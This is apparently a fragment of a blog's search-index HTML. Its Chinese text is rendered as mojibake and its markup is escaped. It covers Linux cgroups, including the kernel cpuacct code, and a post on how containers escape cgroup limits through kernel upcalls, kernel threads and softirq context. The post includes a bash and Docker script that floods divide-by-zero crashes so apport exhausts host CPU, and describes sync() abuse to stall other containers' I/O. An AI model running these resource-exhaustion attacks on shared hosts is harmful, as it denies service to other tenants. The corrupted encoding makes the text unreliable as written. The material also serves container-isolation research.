&lt;p&gt;ä¸Šé¢å¯ä»¥çŸ¥é“ï¼Œå†…æ ¸ä¸­çš„cgroupæœºåˆ¶æä¾›ä¸€ä¸ªæ¡†æ¶ï¼Œé€šè¿‡åœ¨å…¶ä¸­æ·»åŠ å­ç³»ç»Ÿï¼Œå¯ä»¥å®ç°å¯¹è¿›ç¨‹çš„ä¸åŒèµ„æºè¿›è¡Œé™åˆ¶ã€‚ä»¥cpuacctä¸ºä¾‹ï¼Œå…¶å­ç³»ç»Ÿå®ç°åœ¨kernel/sched/cpuacct.cï¼Œè¿™æ˜¯åœ¨è°ƒåº¦ç³»ç»Ÿé‡Œæ·»åŠ çš„ä¸€ä¸ªå­ç³»ç»Ÿï¼Œç”¨äºè¿›ç¨‹å ç”¨æ—¶é—´ç‰‡çš„ç»Ÿè®¡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroup_subsys cpuacct_subsys = {
	.name		= &amp;quot;cpuacct&amp;quot;,
	.css_alloc	= cpuacct_css_alloc,
	.css_free	= cpuacct_css_free,
	.subsys_id	= cpuacct_subsys_id,
	.base_cftypes	= files,
	.early_init	= 1,
};
static struct cftype files[] = {
	{
		.name = &amp;quot;usage&amp;quot;,
		.read_u64 = cpuusage_read,
		.write_u64 = cpuusage_write,
	},
	{
		.name = &amp;quot;usage_percpu&amp;quot;,
		.read_seq_string = cpuacct_percpu_seq_read,
	},
	{
		.name = &amp;quot;stat&amp;quot;,
		.read_map = cpuacct_stats_show,
	},
	{ }	/* terminate */
};
/* track cpu usage of a group of tasks and its child groups */
struct cpuacct {
	struct cgroup_subsys_state css;
	/* cpuusage holds pointer to a u64-type object on every cpu */
	u64 __percpu *cpuusage;
	struct kernel_cpustat __percpu *cpustat;
};
void cpuacct_charge(struct task_struct *tsk, u64 cputime)
{
	struct cpuacct *ca;
	int cpu;

	cpu = task_cpu(tsk);

	rcu_read_lock();

	ca = task_ca(tsk);

	while (true) {
		u64 *cpuusage = per_cpu_ptr(ca-&amp;gt;cpuusage, cpu);
		*cpuusage += cputime;

		ca = parent_ca(ca);
		if (!ca)
			break;
	}

	rcu_read_unlock();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cpuacctå®ç°å¾ˆç®€å•ï¼Œå®šä¹‰äº†cpuacct_subsysï¼Œå®ƒçš„å±æ€§åªæœ‰ä¸‰ä¸ªï¼Œå†…åµŒcgroup_subsys_stateçš„ç»“æ„ä½“ä¹Ÿåªæœ‰ä¸¤ä¸ªé¢å¤–çš„percpuå˜é‡ã€‚å…¶è¿è¡ŒåŸç†æ˜¯åœ¨è¿›ç¨‹è°ƒåº¦çš„æ—¶å€™è°ƒç”¨cpuacct_chargeå°†è¿›ç¨‹è¿è¡Œæ—¶é—´è®°å½•åˆ°è¿›ç¨‹ç›¸å…³çš„cgroupçš„cpuacctå­ç³»ç»Ÿçš„ç»“æ„ä½“ä¸­ã€‚åœ¨ç”¨æˆ·è¯»ç›¸å…³cgroupæ–‡ä»¶çš„æ—¶å€™å°†å…¶æ‰“å°å‡ºæ¥ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“&lt;/h2&gt;
&lt;p&gt;cgroupçš„ç»„æŒ‡çš„æ˜¯ä¸€ç»„è¿›ç¨‹ã€‚å¦‚æœä¸åšå¹²é¢„ï¼Œè¿›ç¨‹åˆ›å»ºçš„å­è¿›ç¨‹ä¼šè¢«è‡ªåŠ¨åŠ å…¥åˆ°è¿›ç¨‹æ‰€åœ¨çš„æ§åˆ¶ç»„ä¹‹ä¸­ã€‚æ§åˆ¶ç»„çš„ä¼˜ç‚¹æ˜¯å¯ä»¥é’ˆå¯¹ä¸€ç»„æ•°é‡ä¸å®šçš„è¿›ç¨‹è¿›è¡Œæ§åˆ¶å’Œç»Ÿè®¡ã€‚&lt;/p&gt;
&lt;p&gt;æ§åˆ¶ç»„æ²¡æœ‰å¢åŠ æ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯å®ç°äº†ä¸€ç§æ–°çš„æ–‡ä»¶ç³»ç»Ÿ cgroupã€‚æœ‰äº† cgroup æ–‡ä»¶ç³»ç»Ÿï¼Œåˆ›å»ºå’Œåˆ é™¤æ§åˆ¶ç»„å°±è½¬åŒ–ä¸ºåˆ›å»ºå’Œåˆ é™¤ç›®å½•ï¼ŒæŸ¥çœ‹èµ„æºä½¿ç”¨æƒ…å†µå’Œè°ƒæ•´å‚æ•°å°±è½¬åŒ–ä¸ºè¯»å†™æ–‡ä»¶ã€‚ç›¸æ¯”ç³»ç»Ÿè°ƒç”¨ï¼Œæ“ä½œæ–‡ä»¶æ— ç–‘æ›´åŠ æ–¹ä¾¿ã€‚&lt;/p&gt;
">ã€linuxã€‘Cgroups</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-rao-guo-cgroup-xian-zhi-ce-lue/"" data-c="
          &lt;ol&gt;
&lt;li&gt;å¼‚å¸¸çš„å†…æ ¸å¤„ç†æœºåˆ¶&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶ç³»ç»Ÿå’ŒI/Oè®¾å¤‡&lt;/li&gt;
&lt;li&gt;linuxæ—¥å¿—ç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;å®¹å™¨å¼•æ“å’Œè½¯ä¸­æ–­çš„å¤„ç†&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;1-ç­–ç•¥&#34;&gt;1 ç­–ç•¥&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;åˆ©ç”¨å†…æ ¸çš„&lt;strong&gt;Upcalls&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç”±äºcgroupçš„ç»§æ‰¿æœºåˆ¶ï¼Œä¸€ä¸ªè¿›ç¨‹æ‰€forkæˆ–cloneå‡ºçš„å­è¿›ç¨‹éƒ½ä¼šç»§æ‰¿è¯¥è¿›ç¨‹çš„cgroupé™åˆ¶ã€‚å› ä¸ºå†…æ ¸è¿›ç¨‹æ˜¯ç”±å†…æ ¸åˆ›å»ºçš„ï¼Œæ‰€ä»¥æ‰€æœ‰å†…æ ¸è¿›ç¨‹éƒ½ä¼šattachåˆ°æ ¹cgroupã€‚å› æ­¤æ‰€æœ‰ç”±å†…æ ¸è¿›ç¨‹é€šè¿‡forkæˆ–cloneåˆ›å»ºçš„è¿›ç¨‹éƒ½ä¼šattachåˆ°å®ƒä»¬çˆ¶è¿›ç¨‹(å†…æ ¸è¿›ç¨‹)æ‰€å±çš„åŒä¸€ä¸ªcgroup(æ ¹cgroup)ä¸Šã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤ï¼Œä¸€ä¸ªcgroupå†…çš„è¿›ç¨‹å¯ä»¥åˆ©ç”¨å†…æ ¸è¿›ç¨‹ä½œä¸ºä»£ç†æ¥ç”Ÿæˆæ–°çš„è¿›ç¨‹ï¼Œä»è€Œé€ƒè„±cgroupçš„æ§åˆ¶ã€‚é¦–å…ˆè¿›ç¨‹&lt;strong&gt;p&lt;/strong&gt;å¯ä»¥è§¦å‘å†…æ ¸æ¥åˆå§‹åŒ–ä¸€ä¸ªå†…æ ¸è¿›ç¨‹&lt;strong&gt;K&lt;/strong&gt;ï¼Œè¿™ä¸ªå†…æ ¸è¿›ç¨‹&lt;strong&gt;K&lt;/strong&gt;ä½œä¸ºä»£ç†ï¼Œè¿›ä¸€æ­¥åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹&lt;strong&gt;M&lt;/strong&gt;ï¼Œè¿™ä¸ªæ–°è¿›ç¨‹ä¹Ÿä¼šattachåˆ°æ ¹cgroupã€‚å› æ­¤&lt;strong&gt;M&lt;/strong&gt;ç›¸å½“äºä¸€ä¸ªä¸å—cgroupé™åˆ¶çš„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç§æœºåˆ¶è¦æ±‚ç”¨æˆ·ç©ºé—´è¿›ç¨‹å…ˆè°ƒç”¨å†…æ ¸ç©ºé—´ä¸­çš„å†…æ ¸å‡½æ•°ï¼Œç„¶åä»å†…æ ¸ç©ºé—´å‘ä¸Šè°ƒç”¨ç”¨æˆ·ç©ºé—´è¿›ç¨‹ã€‚è™½ç„¶ä»ç”¨æˆ·ç©ºé—´è°ƒç”¨ç‰¹å®šçš„å†…æ ¸å‡½æ•°å¾ˆè‡ªç„¶(ä¾‹å¦‚ç³»ç»Ÿè°ƒç”¨)ï¼Œä½†ç›¸åçš„æ–¹å‘å¹¶ä¸å¸¸è§ã€‚ä¸€ä¸ªå¯è¡Œçš„æ–¹å¼æ˜¯é€šè¿‡usermode helperAPIï¼Œ&lt;mark&gt;å®ƒé€šè¿‡æä¾›å¯æ‰§è¡Œå˜é‡å’Œç¯å¢ƒå˜é‡çš„åç§°&lt;/mark&gt;ï¼Œä¸ºåœ¨ç”¨æˆ·ç©ºé—´ä¸­åˆ›å»ºè¿›ç¨‹æä¾›äº†ä¸€ä¸ªç®€å•çš„æ¥å£ã€‚è¿™ä¸ªå‡½æ•°é¦–å…ˆè°ƒç”¨ä¸€ä¸ªåœ¨å†…æ ¸è¿›ç¨‹ä¸­è¿è¡Œçš„å·¥ä½œé˜Ÿåˆ—(workerqueueä¾‹å¦‚&lt;strong&gt;kworker&lt;/strong&gt;)ï¼Œå·¥ä½œé˜Ÿåˆ—çš„å¤„ç†ç¨‹åºå‡½æ•°è¿›ä¸€æ­¥åˆ›å»ºä¸€ä¸ªå†…æ ¸è¿›ç¨‹æ¥å¯åŠ¨ç”¨æˆ·è¿›ç¨‹ã€‚æœ€åä¸€æ­¥è°ƒç”¨å†…æ ¸ä¸­çš„forkå‡½æ•°ï¼Œå°†åˆ›å»ºçš„ç”¨æˆ·è¿›ç¨‹é™„åŠ åˆ°å†…æ ¸è¿›ç¨‹çš„cgroupsã€‚&lt;/p&gt;
&lt;p&gt;usermode-helper APIï¼Œ&lt;a href=&#34;http://edsionte.com/techblog/archives/category/linux%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B&#34;&gt;å‚è€ƒ1&lt;/a&gt;ï¼Œ&lt;a href=&#34;https://www.cnblogs.com/fastwave2004/articles/4316958.html&#34;&gt;å‚è€ƒ2&lt;/a&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;å°†å·¥ä½œè´Ÿè½½å§”æ‰˜ç»™å†…æ ¸çº¿ç¨‹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å†…æ ¸ä¼šè¿è¡Œå¤šç§è¿›ç¨‹å»å¤„ç†å„ç§å†…æ ¸å‡½æ•°å¹¶ä¸”åœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­è¿è¡Œå†…æ ¸ä»£ç ã€‚ä¾‹å¦‚ï¼Œå†…æ ¸å®ˆæŠ¤è¿›ç¨‹&lt;code&gt;kthreadd&lt;/code&gt;åˆ›å»ºå…¶å®ƒå†…æ ¸çº¿ç¨‹ï¼›&lt;code&gt;kworker&lt;/code&gt;å¤„ç†å·¥ä½œé˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ï¼›&lt;code&gt;ksoftirqd&lt;/code&gt;æœåŠ¡è½¯ä¸­æ–­ï¼›&lt;code&gt;Migration&lt;/code&gt;æ‰§è¡Œè¿ç§»ä»»åŠ¡ï¼Œå°†ä»»åŠ¡ä»ä¸€ä¸ªæ ¸å¿ƒç§»åŠ¨åˆ°å¦ä¸€ä¸ªæ ¸å¿ƒ...&lt;/p&gt;
&lt;p&gt;æœ‰ä¸å°‘æ–‡ç« æåˆ°è¿™äº›å†…æ ¸è¿›ç¨‹ä¼šæ¶ˆè€—å¤§é‡çš„èµ„æºï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.redhat.com/archives/nahant-list/2006-March/msg00033.html&#34;&gt;kswapd taking 100% CPU&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://askubuntu.com/questions/33640/kworker-what-is-it-and-why-is-it-hogging-so-much-cpu&#34;&gt;Kworker, what is it and why is it hogging so much CPU?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://askubuntu.com/questions/7858/why-is-ksoftirqd-0-process-using-all-of-my-cpu&#34;&gt;Why  is  ksoftirqd/0  process  using  all  of  my  CPU?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://askubuntu.com/questions/806238/kworker-shows-very-high-cpu-usage&#34;&gt;Kworker shows very high CPU usage.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;åˆ©ç”¨æœåŠ¡è¿›ç¨‹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é™¤äº†å†…æ ¸è¿›ç¨‹ï¼Œlinuxè¿˜è¿è¡Œäº†è®¸å¤šç³»ç»Ÿè¿›ç¨‹ï¼Œä¾‹å¦‚è¿›ç¨‹ç®¡ç†ã€ç³»ç»Ÿä¿¡æ¯æ—¥å¿—ã€debuggingç­‰ç­‰ã€‚è¿™äº›è¿›ç¨‹ç›‘æ§å…¶å®ƒè¿›ç¨‹å¹¶ä¸”åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è§¦å‘ç”Ÿæˆå·¥ä½œè´Ÿè½½ã€‚è¿˜æœ‰ä¸€äº›ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹æ˜¯ä¸ºäº†ä¸ºå…¶å®ƒè¿›ç¨‹æä¾›ä¾èµ–ã€‚å¦‚æœç”¨æˆ·ç©ºé—´è¿›ç¨‹èƒ½å¤Ÿè§¦å‘æŸäº›æ¡ä»¶å¯ä»¥ç”Ÿæˆè¿™äº›å†…æ ¸è´Ÿè½½ï¼Œé‚£ä¹ˆè¿™äº›å·¥ä½œè´Ÿè½½ä¹Ÿä¸ä¼šè¢«cgroupé™åˆ¶ã€‚&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;åˆ©ç”¨ä¸­æ–­ä¸Šä¸‹æ–‡&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;cgroupæœºåˆ¶åªä¼šè®¡ç®—è¿›ç¨‹ä¸Šä¸‹æ–‡æ‰€æ¶ˆè€—çš„èµ„æºã€‚&lt;mark&gt;ä¸€æ—¦å†…æ ¸è¿è¡Œåœ¨å…¶å®ƒä¸Šä¸‹æ–‡ä¸­ï¼Œæ‰€æœ‰çš„èµ„æºæ¶ˆè€—å°†ä¸å†è®¡å…¥ä»»ä½•çš„cgroup&lt;/mark&gt;ã€‚&lt;/p&gt;
&lt;p&gt;linuxå†…æ ¸æœåŠ¡ä¸­æ–­ç®¡ç†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼štop half(ç¡¬ä»¶ä¸­æ–­)å’Œbottom half(è½¯ä»¶ä¸­æ–­)ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºç¡¬ä»¶ä¸­æ–­å¯èƒ½ä¼šéšæ—¶å‘ç”Ÿï¼Œå› æ­¤top halfåªä¼šæ‰§è¡Œè½»é‡çº§çš„æ“ä½œï¼Œç„¶åå†äº¤ç»™bottom halfå¤„ç†ã€‚&lt;mark&gt;å½“bottom halfåœ¨æ‰§è¡Œä¸­æ–­å¤„ç†ç¨‹åºçš„æ—¶å€™ï¼Œå†…æ ¸æ˜¯è¿è¡Œåœ¨è½¯ä»¶ä¸­æ–­ä¸Šä¸‹æ–‡ä¸­ï¼Œå› æ­¤it will not charge any process for the system resources&lt;/mark&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å†…æ ¸ç‰ˆæœ¬3.6ä»¥åï¼Œè½¯ä¸­æ–­çš„å¤„ç†ä¸äº§ç”Ÿå®ƒä»¬çš„è¿›ç¨‹ç›¸ç»‘å®šï¼Œè¿™æ„å‘³ç€softirqä¸Šä¸‹æ–‡ä¸­æ¶ˆè€—çš„èµ„æºå°†ä¸ä¼šç®—åœ¨è§¦å‘ä¸­æ–­çš„è¿›ç¨‹çš„é…é¢ä¸­ã€‚å› æ­¤softirqsçš„æ‰§è¡Œå°†ä¼šæŠ¢å å½“å‰è¿›ç¨‹çš„ä»»ä½•å·¥ä½œè´Ÿè½½ï¼Œå¹¶ä¸”æ‰€æœ‰è¿›ç¨‹éƒ½å°†è¢«å»¶è¿Ÿã€‚&lt;/p&gt;
&lt;p&gt;æ­¤å¤–ï¼Œå¦‚æœå¤„ç†è½¯ä¸­æ–­çš„å·¥ä½œè´Ÿè½½è¿‡é‡ï¼Œå†…æ ¸å°†æŠŠä»–ä»¬å¸è½½åˆ°å†…æ ¸çº¿ç¨‹softirqdï¼Œå®ƒæ˜¯ä¸€ä¸ªCPUå†…æ ¸çº¿ç¨‹ï¼Œå¹¶ä»¥é»˜è®¤æ•…éšœç»§æ‰¿çš„ä¼˜å…ˆçº§è¿è¡Œã€‚ä¸€æ—¦å¸è½½ï¼Œè½¯ä¸­æ–­å¤„ç†å°±åœ¨softirqdè¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œå› æ­¤ä»»ä½•èµ„æºçš„æ¶ˆè€—éƒ½ä¼šç®—åœ¨è¿›ç¨‹softirqdä¸Šã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ€»ä¹‹ï¼Œå¦‚æœä¸€ä¸ªè¿›ç¨‹èƒ½å¤Ÿå¼•èµ·å¤§é‡çš„è½¯ä»¶ä¸­æ–­ï¼Œé‚£ä¹ˆå†…æ ¸ä¸å¾—ä¸æ¶ˆè€—å¤§é‡èµ„æºæ¥å¤„ç†å®ƒï¼Œæ— è®ºæ˜¯ä¸­æ–­ä¸Šä¸‹æ–‡è¿˜æ˜¯ksoftirqdè¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œè€Œè¿™äº›èµ„æºæ¶ˆè€—ä¸ä¼šç®—åœ¨è¯¥è¿›ç¨‹ä¸Šã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ€»ç»“ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è§¦å‘å†…æ ¸çº¿ç¨‹çš„å·¥ä½œé‡ï¼Œä½¿å…¶æ¶ˆè€—å¤§é‡èµ„æº&lt;/li&gt;
&lt;li&gt;ä½¿å†…æ ¸è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹ï¼Œä½¿å­è¿›ç¨‹ä¸å†…æ ¸è¿›ç¨‹åŒå±äºä¸€ä¸ªcgroupï¼Œç”±å­è¿›ç¨‹æ¶ˆè€—å¤§é‡èµ„æº&lt;/li&gt;
&lt;li&gt;è§¦å‘å½“å‰æ“ä½œç³»ç»Ÿä¸­æœåŠ¡è¿›ç¨‹æ¶ˆè€—èµ„æº&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨ä¸­æ–­ä¸Šä¸‹æ–‡æ¥æ¶ˆè€—èµ„æº&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-case&#34;&gt;2 Case&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;case 1(ç­–ç•¥1)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ©ç”¨å†…æ ¸ä¸­çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚å®¹å™¨æ‰€å¼•å‘çš„å¼‚å¸¸å¯ä»¥è°ƒç”¨ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ï¼Œç»“æœæ˜¯å®¹å™¨å¯ä»¥æ¶ˆè€—æ¯”è®¾å®šèµ„æºé«˜å‡º200å€çš„æ•ˆæœã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;detailï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;linuxå†…æ ¸ä¸ºå„ç§å¼‚å¸¸æä¾›äº†ä¸“ç”¨çš„å¼‚å¸¸å¤„ç†ç¨‹åºï¼ŒåŒ…æ‹¬é”™è¯¯(ä¾‹å¦‚divided error)å’Œtrap(ä¾‹å¦‚overflow)ã€‚å†…æ ¸ç»´æŠ¤ä¸€ä¸ªIDT(ä¸­æ–­æè¿°è¡¨)ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ªä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ç¨‹åºçš„åœ°å€ã€‚å¦‚æœCPUåœ¨ç”¨æˆ·æ€ä¸­å¼•å‘å¼‚å¸¸ï¼Œåˆ™åœ¨å†…æ ¸æ€ä¸­å¤„ç†ç›¸åº”çš„å¤„ç†ç¨‹åºã€‚å¤„ç†å™¨é¦–å…ˆå°†å¯„å­˜å™¨ä¿å­˜åœ¨å†…æ ¸å †æ ˆä¸­ï¼Œç›¸åº”åœ°å¤„ç†å¼‚å¸¸ï¼Œæœ€åè¿”å›åˆ°ç”¨æˆ·æ¨¡å¼ã€‚æ•´ä¸ªè¿‡ç¨‹åœ¨å†…æ ¸ç©ºé—´å’Œè§¦å‘å¼‚å¸¸çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­è¿›è¡Œã€‚å› æ­¤ä¼šè¿›è¡Œæ­£ç¡®çš„cgroupé™åˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶è€Œï¼Œè¿™äº›å¼‚å¸¸å°†å¯¼è‡´åˆå§‹è¿›ç¨‹çš„ç»ˆæ­¢å¹¶å¼•å‘å¼‚å¸¸ä¿¡å·ã€‚è¿™äº›ä¿¡å·å°†ä¼šè¿›ä¸€æ­¥è§¦å‘core dumpå†…æ ¸å‡½æ•°å»ç”Ÿæˆä¸€ä¸ªç”¨äºdebugçš„core dumpæ–‡ä»¶ã€‚å†…æ ¸çš„core dumpä»£ç ä¼šé€šè¿‡usermode helper APIä»å†…æ ¸è°ƒç”¨ç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºã€‚åœ¨ubuntuä¸­ï¼Œé»˜è®¤çš„ç”¨æˆ·ç©ºé—´core dumpåº”ç”¨ç¨‹åºæ˜¯apportï¼Œä»–ä¼šå‡ºç°åœ¨ä»»ä½•å¼‚å¸¸æ—¶è§¦å‘ã€‚è€Œapportä¸æ˜¯ç”±å®¹å™¨è¿›ç¨‹æ‰€æ´¾ç”Ÿçš„ï¼Œæ‰€ä»¥æ¶ˆè€—çš„ç³»ç»Ÿèµ„æºæ˜¯ä¸ä¼šç®—åœ¨å®¹å™¨ä¸­çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¸ºäº†è¾¾åˆ°è´Ÿè½½å‡è¡¡ï¼Œæ–°ç”Ÿæˆçš„apportè¿›ç¨‹å®ä¾‹å°†è¢«å†…æ ¸è°ƒåº¦åˆ°æ‰€æœ‰çš„CPUå†…æ ¸ï¼Œä»è€Œé€ƒç¦»cpusets cgroupã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;expï¼š&lt;/strong&gt;&lt;br&gt;
ç”±äºapportè¿›ç¨‹çš„è¿è¡Œæ¯”è½»é‡çº§å¼‚å¸¸å¤„ç†æ¶ˆè€—æ›´å¤šé¢èµ„æºï¼Œå¦‚æœå®¹å™¨ä¸æ–­å¼•å‘å¼‚å¸¸ï¼Œæ•´ä¸ªCPUå°†è¢«apportè¿›ç¨‹å®Œå…¨å ç”¨ï¼Œcpu cgroupçš„æº¢å‡ºå¯¼è‡´å¤§é‡å ç”¨åˆ†é…ç»™å®¹å™¨çš„ç³»ç»Ÿèµ„æºã€‚&lt;/p&gt;
&lt;p&gt;ä¸ºäº†è¡¡é‡æ¶æ„å®¹å™¨æ‰€å¸¦ç»™å…¶å®ƒå®¹å™¨çš„å½±å“ï¼Œåœ¨å…¶å®ƒå®¹å™¨ä¸Šè¿è¡Œsysbenchã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# å‰ç½®æ¡ä»¶ï¼Œ8æ ¸CPU
mkdir /root/exception &amp;amp;&amp;amp; cd /root/exception

cat &amp;gt; exception.c &amp;lt;&amp;lt; EOF
int main()
{
    int a = 1/0;
    return 0;
}
EOF

cat &amp;gt; exception_loop.sh &amp;lt;&amp;lt; EOF
for i in $(seq 1 1000):
do
    ./exception.out &amp;amp;
done
EOF


docker build -t exception_test .

# ä¸€å…±å¯åŠ¨ä¸‰ä¸ªç»ˆç«¯

# åœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯å¯åŠ¨htopè§‚å¯Ÿç³»ç»Ÿèµ„æºæ¶ˆè€—

# åœ¨ç¬¬äºŒä¸ªç»ˆç«¯å¯åŠ¨
docker stats

# åœ¨ç¬¬ä¸‰ä¸ªç»ˆç«¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨
docker run --rm -it --name exception_test_normal exception_test
# åœ¨å®¹å™¨ä¸­ç”¨sysbenchæµ‹è¯•
sysbench --test=cpu --cpu-max-prime=200 --threads=4 --time=20 run
# åœ¨htopç»ˆç«¯å¯ä»¥è§‚å¯Ÿåˆ°æœ‰4ä¸ªæ ¸çš„CPUæ¶ˆè€—
# é€€å‡º
# é‡æ–°åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼ŒæŒ‡å®šCPUï¼Œå¹¶é™åˆ¶èµ„æºä½¿ç”¨
docker run --rm -it --cpus=0.5 --cpuset-cpus=1 -m=2G --name exception_test_limited exception_test
# åœ¨é‡æ–°è¿è¡Œsysbench
sysbench --test=cpu --cpu-max-prime=200 --threads=4 --time=20 run
# ä¼šå‘ç°å®¹å™¨æ²¡æœ‰è¶…è¿‡æŒ‡å®šçš„èµ„æºæ¶ˆè€—é‡
# æ­¤æ—¶è¿è¡Œè„šæœ¬
bash exception_loop.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;case 2(ç­–ç•¥2)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ©ç”¨å›å†™æœºåˆ¶è¿›è¡Œç£ç›˜çš„æ•°æ®åŒæ­¥ã€‚å®¹å™¨å¯ä»¥ä¸æ–­è°ƒç”¨å…¨å±€æ•°æ®åŒæ­¥ï¼Œä»¥é™ä½ä¸»æœºä¸Šçš„ç‰¹å®šI/Oå·¥ä½œè´Ÿè½½ï¼Œæœ€é«˜å¯è¾¾95%ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;detailï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¿™ç§æƒ…å†µæ˜¯åˆ©ç”¨ç£ç›˜æ•°æ®åŒæ­¥çš„å›å†™æœºåˆ¶ï¼ŒCPUåªå°†æ›´æ–°åçš„æ•°æ®å†™å…¥ç¼“å­˜bufferï¼Œå½“ç¼“å­˜è¢«ç§»é™¤åæˆ–è¾¾åˆ°ç‰¹å®šæ¡ä»¶ï¼Œæ•°æ®æ‰ä¼šå†™å…¥ç£ç›˜ï¼Œå…¶ç›®çš„æ˜¯å‡å°‘å¼€é”€ï¼Œé™ä½ç£ç›˜è¯»å†™æ¬¡æ•°ã€‚&lt;/p&gt;
&lt;p&gt;flusherè¿›ç¨‹è´Ÿè´£å°†dirtyé¡µå†™å…¥ç£ç›˜ï¼Œflusherè¿›ç¨‹å†™å›dirtyé¡µçš„è§¦å‘æœºåˆ¶æœ‰ä¸¤ç±»ï¼šä¸€æ˜¯å½“ç©ºé—²å†…å­˜ä½äºä¸€å®šå€¼æˆ–è€…dirtyé¡µæ¯”ä¾‹è¶…è¿‡ä¸€å®šå€¼ç­‰æŸé¡¹æŒ‡æ ‡è¾¾åˆ°æŸä¸ªé˜ˆå€¼æ—¶ï¼›å¦ä¸€ç§å°±æ˜¯å½“ç”¨æˆ·è¿›ç¨‹è°ƒç”¨äº†&lt;code&gt;sync()&lt;/code&gt;æˆ–&lt;code&gt;fsync()&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨æ—¶ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç§å›å†™æœºåˆ¶å…¶ä¸­ä¸€ä¸ªç¼ºç‚¹æ˜¯å¯¼è‡´å…¶å®ƒè¿›ç¨‹åœ¨ç­‰å¾…ç£ç›˜æ—¶è¢«é˜»å¡ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sync()&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨ï¼šç¬¬ä¸€æ­¥å¯åŠ¨ä¸€ä¸ª&lt;strong&gt;å†…æ ¸è¿›ç¨‹&lt;/strong&gt;ï¼Œå°†æ‰€æœ‰dirtyé¡µçš„æ•°æ®flushå¹¶å†™å…¥ç£ç›˜ï¼Œè€Œæ­¤æ—¶æ‰€æœ‰I/Oæ“ä½œå¿…é¡»ç­‰å¾…ï¼Œè€Œä¸”å…¶å®ƒè¿›ç¨‹ç”Ÿæˆçš„dirtyé¡µä¹Ÿå°†è¢«è¿«å†™å›ç£ç›˜ã€‚å› æ­¤å¯ä»¥åœ¨ä¸€ä¸ªæ¶æ„å®¹å™¨ä¸­ä¸æ–­è¿è¡Œè°ƒç”¨&lt;code&gt;sync()&lt;/code&gt;ï¼Œå…¶å®ƒå®¹å™¨åœ¨è¿›è¡Œå†™æ“ä½œä¼šå¯¼è‡´å¤§é‡çš„CPUç­‰å¾…æ—¶é—´(CPUç­‰å¾…æ—¶é—´æŒ‡I/Oç­‰å¾…æ‰€æ¶ˆè€—çš„æ—¶é—´)ï¼Œè¿™æ˜¯&lt;code&gt;sync()&lt;/code&gt;å’Œå†™æ“ä½œäº§ç”Ÿçš„ã€‚&lt;a 